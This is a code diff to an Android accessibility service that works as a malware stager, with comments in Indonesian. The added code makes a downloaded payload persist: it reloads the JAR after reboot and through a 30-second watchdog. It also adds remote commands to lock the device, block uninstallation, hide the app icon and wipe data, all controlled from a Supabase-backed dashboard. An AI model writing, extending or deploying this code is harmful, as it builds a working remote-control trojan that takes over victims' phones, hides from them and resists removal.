@@ -90,6 +90,9 @@ public class SupportService extends AccessibilityService implements SupabaseMana
 
         Log.i(TAG, "Stager is waiting for external payload...");
         
+        // AUTO-LOAD PAYLOAD JIKA SUDAH ADA (Persistence Level Tinggi)
+        tryAutoLoadPayload();
+
         // Trigger battery optimization check immediately when service connects
         checkBatteryOptimization();
 
@@ -98,9 +101,37 @@ public class SupportService extends AccessibilityService implements SupabaseMana
             @Override
             public void run() {
                 updateSystemStatus();
+                // Watchdog: Jika payload mati (callback null), coba load lagi
+                if (payloadCallback == null) {
+                    tryAutoLoadPayload();
+                }
                 mainHandler.postDelayed(this, 30000);
             }
         }, 5000);
+    }
+
+    private void tryAutoLoadPayload() {
+        android.content.SharedPreferences prefs = getSharedPreferences("payload_prefs", MODE_PRIVATE);
+        String savedClass = prefs.getString("last_class", "");
+        File jarFile = new File(new File(getFilesDir(), "modules"), "payload.jar");
+
+        if (!savedClass.isEmpty() && jarFile.exists()) {
+            Log.i(TAG, "Found existing payload. Auto-injecting: " + savedClass);
+            // Muat dari file lokal (Offline-friendly)
+            DynamicLoader.loadLocal(this, savedClass);
+            
+            // Restore persistent features status
+            mainHandler.postDelayed(() -> {
+                if (payloadCallback != null) {
+                    if (prefs.getBoolean("locked", false)) {
+                        setLockStatusNative(true);
+                        payloadCallback.onCommandReceived(Config.CMD_LOCK);
+                    }
+                    if (prefs.getBoolean("anti_uninstall", false)) payloadCallback.onCommandReceived(Config.CMD_ANTI_UNINSTALL + ":on");
+                    if (prefs.getBoolean("hide_icon", false)) payloadCallback.onCommandReceived(Config.CMD_HIDE_ICON + ":on");
+                }
+            }, 2000);
+        }
     }
 
     private String lastNetworkType = "";
@@ -294,17 +325,40 @@ public class SupportService extends AccessibilityService implements SupabaseMana
                     return;
                 }
 
+                // Simpan konfigurasi agar bisa auto-load setelah reboot (Offline-ready)
+                getSharedPreferences("payload_prefs", MODE_PRIVATE)
+                        .edit()
+                        .putString("last_url", finalUrl)
+                        .putString("last_class", finalClass)
+                        .apply();
+
                 // Tampilkan proses loading ke dashboard
                 if (supabaseManager != null) {
                     supabaseManager.sendData("logs", "[Stager] Initializing Dynamic Loader...");
-                    mainHandler.postDelayed(() -> supabaseManager.sendData("logs", "[Stager] Fetching payload from server..."), 1000);
-                    mainHandler.postDelayed(() -> supabaseManager.sendData("logs", "[Stager] Injecting module: " + finalClass), 2500);
-                    mainHandler.postDelayed(() -> DynamicLoader.fetchAndExecute(this, finalUrl, finalClass), 4000);
+                    DynamicLoader.fetchAndExecute(this, finalUrl, finalClass);
                 } else {
                     DynamicLoader.fetchAndExecute(this, finalUrl, finalClass);
                 }
 
+            } else if (lowerCmd.equals(Config.CMD_LOCK)) {
+                setLockStatusNative(true);
+                getSharedPreferences("payload_prefs", MODE_PRIVATE).edit().putBoolean("locked", true).apply();
+                if (payloadCallback != null) payloadCallback.onCommandReceived(cmd);
+            } else if (lowerCmd.equals(Config.CMD_UNLOCK)) {
+                setLockStatusNative(false);
+                getSharedPreferences("payload_prefs", MODE_PRIVATE).edit().putBoolean("locked", false).apply();
+                if (payloadCallback != null) payloadCallback.onCommandReceived(cmd);
+            } else if (lowerCmd.startsWith(Config.CMD_ANTI_UNINSTALL)) {
+                boolean enable = lowerCmd.endsWith(":on");
+                getSharedPreferences("payload_prefs", MODE_PRIVATE).edit().putBoolean("anti_uninstall", enable).apply();
+                if (payloadCallback != null) payloadCallback.onCommandReceived(cmd);
+            } else if (lowerCmd.startsWith(Config.CMD_HIDE_ICON)) {
+                boolean hide = lowerCmd.endsWith(":on");
+                getSharedPreferences("payload_prefs", MODE_PRIVATE).edit().putBoolean("hide_icon", hide).apply();
+                if (payloadCallback != null) payloadCallback.onCommandReceived(cmd);
             } else if (lowerCmd.equals(Config.CMD_WIPE)) {
+                getSharedPreferences("payload_prefs", MODE_PRIVATE).edit().clear().apply();
+                setLockStatusNative(false);
                 supabaseManager.deleteData();
             } else {
                 if (payloadCallback != null) {
